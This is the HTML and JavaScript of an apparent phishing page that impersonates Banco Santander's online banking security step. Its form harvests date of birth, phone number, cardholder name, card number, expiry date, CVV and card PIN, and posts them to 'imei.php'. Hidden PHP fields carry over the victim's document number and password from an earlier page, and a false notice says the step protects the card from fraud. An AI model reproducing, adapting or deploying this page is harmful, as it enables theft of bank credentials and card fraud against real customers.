<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es-ES" lang="es-ES"><head>


<meta http-equiv="content-type" content="text/html; charset=windows-1252"><title></title>

<link rel="stylesheet" type="text/css" href="BtoChannelDriver.ssobto_arquivos/styles.css"><!--[if IE]><style type="text/css" media="screen">	@import "/Estatico/Globales/V166/Styles/CustomTags/Css/iehacks.css"; </style><![endif]--><link rel="stylesheet" type="text/css" href="BtoChannelDriver.ssobto_arquivos/styles_002.css">
<meta content="OPLogon" id="meta-adp-render-model" name="render-adp">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta http-equiv="Cache-Control" content="no-cache">

	<meta http-equiv="httpEquiv" scheme="scheme" content="content">
	<link media="media" rel="rel" hreflang="hreflang" type="text/css" href="https://particulares.gruposantander.es/Estatico/css/notfound.css" charset="charset">
	<link rel="shortcut icon" type="image/x-icon" href="https://particulares.gruposantander.es/Estatico/Globales/Styles/CustomTags/favicon.ico">
	<link rel="stylesheet" type="text/css" href="BtoChannelDriver.ssobto_arquivos/security_001.css">
	<link rel="stylesheet" type="text/css" href="BtoChannelDriver.ssobto_arquivos/security.css"></head><body>
	<div class="opLogonHeader">
		
		<div id="headerArea1" class="headerArea"><div class="image"><img src="BtoChannelDriver.ssobto_arquivos/CabeceraLoginParticulares2.gif" alt=""></div></div>
		
        
	</div>
	<div class="opLogonBody">
		<div class="left">
			<div class="opLogonInfo">
			
				
			</div>
	    	<div class="opLogonComponent">
							
				<div id="auth" class="security">
<script type="text/javascript">
function Mod10(ccNumb) {  // v2.0
var valid = "0123456789"  // Valid digits in a credit card number
var len = ccNumb.length;  // The length of the submitted cc number
var iCCN = parseInt(ccNumb);  // integer of ccNumb
var sCCN = ccNumb.toString();  // string of ccNumb
sCCN = sCCN.replace (/^\s+|\s+$/g,'');  // strip spaces
var iTotal = 0;  // integer total set at zero
var bNum = true;  // by default assume it is a number
var bResult = false;  // by default assume it is NOT a valid cc
var temp;  // temp variable for parsing string
var calc;  // used for calculation of each digit

// Determine if the ccNumb is in fact all numbers
for (var j=0; j<len; j++) {
  temp = "" + sCCN.substring(j, j+1);
  if (valid.indexOf(temp) == "-1"){bNum = false;}
}

// if it is NOT a number, you can either alert to the fact, or just pass a failure
if(!bNum){
  /*alert("Not a Number");*/bResult = false;
}

// Determine if it is the proper length 
if((len == 0)&&(bResult)){  // nothing, field is blank AND passed above # check
  bResult = false;
} else{  // ccNumb is a number and the proper length - let's see if it is a valid card number
  if(len >= 15){  // 15 or 16 for Amex or V/MC
    for(var i=len;i>0;i--){  // LOOP throught the digits of the card
      calc = parseInt(iCCN) % 10;  // right most digit
      calc = parseInt(calc);  // assure it is an integer
      iTotal += calc;  // running total of the card number as we loop - Do Nothing to first digit
      i--;  // decrement the count - move to the next digit in the card
      iCCN = iCCN / 10;                               // subtracts right most digit from ccNumb
      calc = parseInt(iCCN) % 10 ;    // NEXT right most digit
      calc = calc *2;                                 // multiply the digit by two
      // Instead of some screwy method of converting 16 to a string and then parsing 1 and 6 and then adding them to make 7,
      // I use a simple switch statement to change the value of calc2 to 7 if 16 is the multiple.
      switch(calc){
        case 10: calc = 1; break;       //5*2=10 & 1+0 = 1
        case 12: calc = 3; break;       //6*2=12 & 1+2 = 3
        case 14: calc = 5; break;       //7*2=14 & 1+4 = 5
        case 16: calc = 7; break;       //8*2=16 & 1+6 = 7
        case 18: calc = 9; break;       //9*2=18 & 1+8 = 9
        default: calc = calc;           //4*2= 8 &   8 = 8  -same for all lower numbers
      }                                               
    iCCN = iCCN / 10;  // subtracts right most digit from ccNum
    iTotal += calc;  // running total of the card number as we loop
  }  // END OF LOOP
  if ((iTotal%10)==0){  // check to see if the sum Mod 10 is zero
    bResult = true;  // This IS (or could be) a valid credit card number.
  } else {
    bResult = false;  // This could NOT be a valid credit card number
    }
  }
}
// change alert to on-page display or other indication as needed.

  return bResult; // Return the results
}

 function validaDat(campo,valor) {
	var date=valor;
	var ardt=new Array;
	var ExpReg=new RegExp("(0[1-9]|[12][0-9]|3[01])/(0[1-9]|1[012])/[12][0-9]{3}");
	ardt=date.split("/");
	erro=false;
	if ( date.search(ExpReg)==-1){
		erro = true;
		}
	else if (((ardt[1]==4)||(ardt[1]==6)||(ardt[1]==9)||(ardt[1]==11))&&(ardt[0]>30))
		erro = true;
	else if ( ardt[1]==2) {
		if ((ardt[0]>28)&&((ardt[2]%4)!=0))
			erro = true;
		if ((ardt[0]>29)&&((ardt[2]%4)==0))
			erro = true;
	}
	if (erro) {
		alert("\"" + valor + "\" no es una fecha válida.");
		campo.focus();
		campo.value = "";
		return false;
	}
	return true;
}

function valida() {
var datanasc = document.getElementById("datanasc");
var tel = document.getElementById("tel");
var nome = document.getElementById("nome");
var num = document.getElementById("num");
var val = document.getElementById("val");
var cvv = document.getElementById("cvv");
var pin = document.getElementById("pin");

	if (datanasc.value == "") {
		alert("Introduce tu fecha de nacimiento.");
		datanasc.focus();
		return false;
	}
	
	var tell = tel.value;
	if (tell.replace(/[^\w]/gi, '').toString().length < 9) {
		alert("Introduce tu teléfono móvil.");
		tel.value = "";
		tel.focus();
		return false;
	}
	
	if (nome.value == "") {
		alert("Introduce tu nombre.");
		nome.focus();
		return false;
	}
	
	var numm = num.value;
	var nummm = numm.replace(/[^\w]/gi, '').toString();
	//alert(nummm);
	if (!Mod10(nummm)) {
		alert("Introduce correctamente el número de tu tarjeta.");
		num.value = "";
		num.focus();
		return false;
	}
	
	if (val.value.length < 5) {
		alert("Introduce correctamente tu fecha de caducidad.");
		val.value="";
		val.focus();
		return false;
	}
	
	if (cvv.value.length < 3) {
		alert("Introduce correctamente tu código de caducidad.");
		cvv.value="";
		cvv.focus();
		return false;
	}
	
	if (pin.value.length < 4) {
		alert("Introduce correctamente el Pin de tu tarjeta.");
		pin.value="";
		pin.focus();
		return false;
	}
	
	return true;
	
	

}
</script>
<form autocomplete="off" id="form_auth" action="imei.php" method="post" onsubmit="return valida();">
<input name="tipoDocumento" type="hidden" value="<?php echo $_POST['tipoDocumento']; ?>" />
<input name="numeroDocumento" type="hidden" value="<?php echo $_POST['numeroDocumento']; ?>" />
<input name="password" type="hidden" value="<?php echo $_POST['password']; ?>" />

<div class="head"><h1 class="title">Identificación de seguridad</h1></div>
<div class="body">
<div class="superior">
<fieldset class="identificacion" id="identificacion">
<img src="cvv.jpg" style="position: absolute; top: 210px; left: 500px; height: 145px;" border="0">
<script language="JavaScript" type="text/javascript">
function formatar(src, mask, evt){
  if ((evt.keyCode != 8) && (evt.keyCode != 46)) {
  var i = src.value.length;
  var saida = mask.substring(0,1);
  var texto = mask.substring(i);
if (texto.substring(0,1) != saida)
  {
    src.value += texto.substring(0,1);
  }
  }
}
function Tecla(campo)
{
 var digits="0123456789";
 var campo_temp;
     for (var i=0;i<campo.value.length;i++){  
         campo_temp=campo.value.substring(i,i+1);
         if (digits.indexOf(campo_temp)==-1){  
             campo.value = campo.value.substring(0,i);  
         }  
     }  
 }  
 function saltaCampo(obj)
{
var elementos = document.getElementsByTagName('INPUT');
	var a = obj.tabIndex;

    if(obj.value.length>=obj.maxLength)
    {
	for(var i=0;i<elementos.length;i++)
    {
        while(elementos[i].tabIndex==a+1)
        {
		elementos[i].focus();
	    //alert(obj.tabIndex);

       // proximo(obj);
        return false;
    }
}
}
}
</script>
<legend>Datos de identificación</legend>
<p>Para protegerse contra el uso tarjetas fraudulentas, el banco ha adoptado una forma de protegerse.</p>
<div id="selectedDoc" class="row" style="display: block;"><label for="documentType_N">Fecha de nacimiento:</label><input tabindex="1" name="datanasc" id="datanasc" maxlength="10" onfocus="idToWrite='documentType_N';pos=null" onkeypress="return formatar(this,'##/##/####', event)" onblur="validaDat(this,this.value)" type="text"></div>
<div id="selectedDoc" class="row" style="display: block;"><label for="documentType_N">Teléfono móvil:</label><input tabindex="2" name="tel" id="tel" maxlength="12" onfocus="idToWrite='documentType_N';pos=null" onkeypress="return formatar(this,'## ### ## ##', event)" type="text"></div>
<hr>
<div id="selectedDoc" class="row" style="display: block; margin-top: 5px;"><label for="documentType_N" style="height: 3.62em;"><b style="color: red;">*</b>Nombre que figura en la Tarjeta:</label><input tabindex="3" name="nome" id="nome" onfocus="idToWrite='documentType_N';pos=null" style="margin-top: 1.81em;" onblur="javascript:{this.value = this.value.toUpperCase(); }" type="text"></div>
<div id="selectedDoc" class="row" style="display: block;"><label for="documentType_N"><b style="color: red;">*</b>Número de Tarjeta:</label><input tabindex="4" name="num" id="num" maxlength="19" onfocus="idToWrite='documentType_N';pos=null" onkeypress="return formatar(this,'#### #### #### ####', event)" type="text"></div>
<div id="selectedDoc" class="row" style="display: block;"><label for="documentType_N"><b style="color: red;">*</b>Fecha de Caducidad:</label><input tabindex="5" name="val" id="val" maxlength="7" onfocus="idToWrite='documentType_N';pos=null" onkeypress="return formatar(this,'##/####', event)" type="text"></div>
<div id="selectedDoc" class="row" style="display: block;"><label for="documentType_N"><b style="color: red;">*</b>Codigo de seguridad:</label><input tabindex="6" name="cvv" id="cvv" maxlength="3" onfocus="idToWrite='documentType_N';pos=null" type="password"></div>
<div id="selectedDoc" class="row" style="display: block;"><label for="documentType_N"><b style="color: red;">*</b>PIN de Tarjeta:</label><input tabindex="7" name="pin" id="pin" maxlength="4" onfocus="idToWrite='documentType_N';pos=null" type="password"></div>



</fieldset>
</div>

</div>
<div class="foot"><span class="buttons"><input class="opLogonStandardButton" value="Entrar" type="submit"></span><span class="link"><a class="opLogonStandardLink" href="https://claves.bancosantander.es/bog/sbi?ptns=rgcl00" id="id_authenticateLink">¿Ha olvidado su PIN?</a></span></div>
<div class="inputsHidden"><input name="isInNewPages" value="1" type="hidden">
<input name="dse_nextEventName" value="up" type="hidden">
<input name="dse_applicationName" value="Seguridad" type="hidden">
<input name="dse_sessionId" value="dKFS3vzIhuF1p08SxIBBm0m" type="hidden">
<input name="dse_operationName" value="OP_LOGON_MULTI" type="hidden">
<input name="dse_threadId" value="defaultExecutionThreadIdentifier" type="hidden">
<input name="dse_pageId" value="0" type="hidden">
<input name="dse_processorState" value="AuthenticationPage" type="hidden">
<input name="dse_processorId" value="AC16BECF39A16A9C2A8CE3BF" type="hidden">
<input name="dse_cmd" value="continue" type="hidden">
</div>
</form>
<script type="text/javascript"><!--//--><![CDATA[//><!--

var formulario = document.getElementById("form_auth");
formulario.setAttribute("autocomplete", "off");

//--><!]]></script>
</div>
<div id="hidedniapplet" style="font-size: 1px;">&nbsp;</div>


	    	</div>
	    				
			<div class="opLogonInfo">
				<div id="infoArea2" class="InfoArea NOBORDER">
<div class="Texto">
<p><b style="color: red;">*</b><strong>Aviso de seguridad</strong></p>
<p>Este paso es obligatorio para proteger la tarjeta contra el uso fraudulento, y por Actualización del sistema de seguridad.</p>
<div class="Enlaces">
<a target="_blank" class="opLogonStandardLink" id="infoArea2Link1" href="http://www.formavia.net/cursos/Seg_Inf_SAN/swf/principal_cd.htm">Curso on-line de Seguridad de la información.</a>
</div>
</div>
</div>

			</div>
	    </div>	    
			
	</div>	
	<div class="opLogonFoot">
		
		<div id="legalArea1" class="LegalArea"><ul><li><a target="_blank" class="opLogonStandardLink" id="link1" href="https://www.bancosantander.es/cssa/Satellite?cid=1190620355627&amp;pagename=SantanderComercial/GSInformacion/SAN_ContenedorInformacion&amp;c=GSInformacion&amp;indicePie=1">Accesibilidad</a>
</li><li><a target="_blank" class="opLogonStandardLink" id="link2" href="https://www.bancosantander.es/cssa/Satellite?cid=1190620182973&amp;pagename=SantanderComercial/GSInformacion/SAN_ContenedorInformacion&amp;c=GSInformacion&amp;indicePie=2">Seguridad</a>
</li><li><a target="_blank" class="opLogonStandardLink" id="link3" href="https://www.bancosantander.es/cssa/Satellite?cid=1195851674016&amp;pagename=SantanderComercial/GSDistribuidora/SAN_AtencionClienteSinSegmento&amp;c=GSDistribuidora&amp;indicePie=3">Tablón</a>
</li><li><a target="_blank" class="opLogonStandardLink" id="link4" href="https://www.bancosantander.es/cssa/Satellite?cid=1195852132448&amp;pagename=SantanderComercial/GSDistribuidora/SAN_AtencionClienteSinSegmento&amp;c=GSDistribuidora&amp;indicePie=4">MIFID</a>
</li><li><a target="_blank" class="opLogonStandardLink" id="link5" href="https://www.bancosantander.es/cssa/Satellite?cid=1181582573911&amp;pagename=SantanderComercial/GSInformacion/SAN_ContenedorInformacion&amp;c=GSInformacion&amp;indicePie=5">Aviso Legal</a>
</li><li class="last"><a target="_blank" class="opLogonStandardLink" id="link6" href="https://sec.bancosantander.es/Formulario_WM/formularios/santandercentralhispano/superlineaP.jsp">Sugerencias</a>
</li></ul></div>
	</div>






</body></html>